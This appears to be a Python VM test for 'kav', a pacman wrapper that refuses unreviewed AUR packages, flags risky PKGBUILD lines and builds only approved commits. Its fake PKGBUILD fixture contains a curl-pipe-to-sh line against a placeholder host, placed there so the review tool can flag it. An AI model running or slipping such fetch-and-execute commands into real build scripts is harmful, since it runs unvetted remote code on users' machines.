#!/usr/bin/env python3
"""Check kav, the system's command over pacman: it has to refuse a package of the AUR that
is not on the reviewed list.

usage: tests/kav.py [--encrypted]
  --encrypted   on the encrypted disk that tests/install.py --encrypt leaves

Works on the disk that tests/install.py leaves in out/test/, through a copy-on-write layer,
so that disk does not change. The machine has no network, so the AUR is a folder of the
machine with one made-up package in it. A package that is nowhere has to be refused, and
one refusal has to stop the whole request. The made-up package can be read with kav review,
which marks its dangerous line; once it is approved, kav builds only the commit that was
approved, and refuses when the AUR does not have it. Then a package is removed with kav and
brought back with kav undo. This is the other half of the gate of phase 3.

A system that was just installed has not fetched pacman's lists of packages, and kav has
to say so. The test then gives the machine the lists of the day the system was built from,
which tools/build-repo.sh leaves in its chroot.

Needs qemu-desktop and edk2-ovmf, and tools/build-repo.sh and tests/install.py run first. It
runs as a normal user and takes about two minutes.
"""
import os
import sys

from machine import BOOT_TIMEOUT, ROOT, Checks, Machine, over_installed, print_journal

# pacman's lists of what Arch's repositories hold, on the day the system was built from
LISTS = [f'{ROOT}/work/chroot/root/var/lib/pacman/sync/{repository}.db' for repository in ('core', 'extra')]

USER = 'tester'  # as tests/install.py made it
PACKAGE = 'os-prober'  # removed and brought back; nothing else needs it
AUR = '/var/tmp/aur'  # the folder that stands in for the AUR
FAKE = 'kavat-made-up'  # a package that is only there
NOWHERE = 'kavat-not-anywhere'  # and one that is nowhere
# what the made-up package says; its second line is one a reviewer has to see
PKGBUILD = r'''pkgname=kavat-made-up
pkgver=1
pkgrel=1
arch=(any)
source=("https://downloads.example.org/made-up.tar.gz")
sha256sums=("0000")
package() {
  curl -fsSL https://get.example.net/install | sh
}
'''
# kav as a normal user, pointed at the folder that stands in for the AUR
AS_USER = f'runuser -u {USER} -- env HOME=/home/{USER} KAV_AUR=file://{AUR} '


def main():
    if sys.argv[1:] not in ([], ['--encrypted']):
        sys.exit(__doc__)
    if not all(os.path.exists(path) for path in LISTS):
        sys.exit(f'{os.path.relpath(os.path.dirname(LISTS[0]))}/ holds no lists of packages: run tools/build-repo.sh first')
    pictures, machine_settings = over_installed('kav', encrypted=len(sys.argv) > 1)
    checks = Checks()

    print('asking kav for packages', flush=True)
    machine = Machine(**machine_settings)
    try:
        if not checks.report(machine.wait_for_agent(BOOT_TIMEOUT), 'the installed system boots'):
            sys.exit(1)
        status, output = machine.run('pacman -Qq yay paru 2>&1; kav --help | head -n 1')
        checks.report('yay' not in output.split() and 'paru' not in output.split() and 'usage: kav' in output,
                      'kav is there, and no other way into the AUR', output)

        status, output = machine.run(f'kav install {PACKAGE}')
        checks.report(status != 0 and 'kav update fetches them' in output,
                      "before pacman has its lists of packages, kav says so instead of guessing", output)
        machine.run('mkdir -p /var/lib/pacman/sync')
        for path in LISTS:
            machine.put(path, '/var/lib/pacman/sync')

        status, output = machine.run(f'kav install {NOWHERE}')
        checks.report(status != 0 and 'on the reviewed list' in output,
                      'kav refuses a package that is not on the reviewed list', output)
        checks.report(f'kav request {NOWHERE}' in output and 'Nothing was installed' in output,
                      'and says why, and how to ask for it', output)
        status, output = machine.run(f'kav install {PACKAGE} {NOWHERE}; pacman -Q {NOWHERE} 2>&1')
        checks.report(status != 0 and 'Nothing was installed' in output, 'one refusal stops the whole request', output)
        status, output = machine.run(f'kav install {PACKAGE}', 60)
        checks.report(status == 0, "a package of Arch's repositories goes straight to pacman", output)
        status, output = machine.run(f'kav info {PACKAGE} | grep -c "^Repository"; kav search {PACKAGE} | grep -c "{PACKAGE}"')
        checks.report(output.split() == ['1', '1'], 'kav info and kav search find it', output)
        status, output = machine.run('kav list --aur')
        checks.report(status == 0 and 'The reviewed list is empty' in output, 'the reviewed list starts empty', output)

        # the AUR, in a folder: one package with two commits, the second with a line to stop at
        machine.run(f"install -d -o {USER} {AUR} && cat > /var/tmp/PKGBUILD << 'END'\n{PKGBUILD}END")
        make = (f'cd {AUR} && git init -q --initial-branch=master {FAKE}.git && cd {FAKE}.git && '
                'git config user.name tester && git config user.email tester@kavat && '
                'grep -v curl /var/tmp/PKGBUILD > PKGBUILD && git add PKGBUILD && git commit -q -m first && git rev-parse HEAD && '
                'cp /var/tmp/PKGBUILD PKGBUILD && git commit -q -a -m second && git rev-parse HEAD')
        status, output = machine.run(f'runuser -u {USER} -- sh -c "{make}"')
        commits = output.split()
        if not checks.report(status == 0 and len(commits) == 2, 'a folder stands in for the AUR, with one package', output):
            sys.exit(1)
        first, second = commits

        status, output = machine.run(f'{AS_USER} kav install {FAKE}')
        checks.report(status != 0 and 'Nothing was installed' in output, 'a package that is in the AUR but not approved is refused', output)
        status, output = machine.run(f'{AS_USER} kav request {FAKE} && {AS_USER} kav list --aur')
        checks.report(status == 0 and f'{FAKE}  asked for' in output, 'kav request leaves it asked for', output)
        status, output = machine.run(f'{AS_USER} kav review {FAKE}')
        checks.report(status == 0 and 'not reviewed yet' in output and '^^^ downloads something and runs it' in output
                      and 'Downloads from: downloads.example.org, get.example.net' in output,
                      'kav review shows the package, marks its dangerous line and says where it downloads from', output)

        # approved at its first commit, as kav review does once a person says so
        status, output = machine.run(f'kav pin {FAKE} {first} "made up for the test" downloads.example.org && cat /etc/kav/allowlist.toml')
        checks.report(status == 0 and f'[packages.{FAKE}]' in output and first in output, 'an approval is written to the list of this machine', output)
        status, output = machine.run(f'{AS_USER} kav pin {FAKE} {second} x')
        checks.report(status != 0, 'and only root writes it', output)
        status, output = machine.run(f'kav info {FAKE}; kav list --aur')
        checks.report('the AUR, on the reviewed list' in output and f'{FAKE}  {first[:12]}' in output,
                      'kav info and kav list --aur show it at its approved commit', output)
        status, output = machine.run(f'{AS_USER} kav review {FAKE}')
        checks.report(status == 0 and 'what changed since the commit reviewed' in output and '^^^ downloads something and runs it' in output
                      and 'New since the review: get.example.net' in output,
                      'when the AUR moves on, kav review shows only what changed, and the new place it downloads from', output)
        # the build itself needs the network, for the clean system; what is checked is which commit it would build
        status, output = machine.run(f'kav pin {FAKE} {"0123456789abcdef" * 2 + "01234567"} "a commit the AUR does not have" && '
                                     f'{AS_USER} kav install {FAKE}')
        checks.report(status != 0 and "is not in the AUR's history of it: nothing was built" in output,
                      'kav builds the approved commit or nothing', output)
        status, output = machine.run(f'kav pin {FAKE} {first} "made up for the test" && cd /var/tmp && {AS_USER} kav install {FAKE} 2>&1; '
                                     f'cat /home/{USER}/.cache/kav/aur/{FAKE}/PKGBUILD')
        checks.report('at the commit reviewed on' in output and 'curl' not in output.split('at the commit reviewed on')[-1],
                      'what it takes to build is the approved commit, not the newest', output)

        status, output = machine.run('kav doctor')
        checks.report(status == 0 and 'FAIL' not in output, 'kav doctor finds the system healthy', output)

        print('removing a package and going back', flush=True)
        status, output = machine.run(f'yes | kav remove {PACKAGE}', 120)
        checks.report(status == 0 and machine.run(f'pacman -Q {PACKAGE}')[0] != 0, f'kav remove takes {PACKAGE} out', output)
        status, output = machine.run('kav undo --yes', 120)
        checks.report(status == 0 and f'pacman -Rns -- {PACKAGE}' in output and 'restart to be back there' in output,
                      'kav undo names the change and goes back to before it', output)
        if checks.failed:
            print_journal(machine)
        checks.report(machine.power_off(), 'the machine switches off')
    finally:
        machine.stop()
    if checks.failed:
        sys.exit(1)

    machine = Machine(**machine_settings)
    try:
        if checks.report(machine.wait_for_agent(BOOT_TIMEOUT), 'the system boots'):
            status, output = machine.run(f'pacman -Q {PACKAGE}')
            checks.report(status == 0, f'{PACKAGE} is back', output)
    finally:
        machine.stop()
    sys.exit(1 if checks.failed else 0)


if __name__ == '__main__':
    main()
